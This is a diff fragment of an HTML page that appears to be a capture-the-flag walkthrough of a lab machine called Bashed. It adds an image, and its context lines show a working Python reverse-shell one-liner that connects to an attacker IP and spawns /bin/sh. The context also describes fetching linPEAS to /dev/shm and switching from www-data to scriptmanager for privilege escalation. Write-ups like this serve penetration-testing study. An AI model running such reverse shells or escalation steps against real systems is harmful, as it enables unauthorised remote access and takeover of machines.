@@ -170,6 +170,9 @@ Finished
                 <p><span class="code">python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="ip">10.10.14.35</span>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</code></p>
             </div>
             <div class="wrapper text">
+                <img src="assets/bashed_4.png">
+            </div>
+            <div class="wrapper text">
                 <p>Now that we have an upgraded TTY we can use wget to download the linPEAS priviledge escalation suggester for Linux. We download this script on the victim machine to the <code class=code>/dev/shm</code> directory.</p>
                 <p>A copy of linPEAS can be downloaded from here: <a href="">LINPEAS_LINK</a></p>
                 <p>We will elevate our priviledges from the www-data user to the scriptmanager user before we run linPEAS. This is done by starting an instance of <code class="code">/bin/bash</code> as the scriptmanager user.</p>
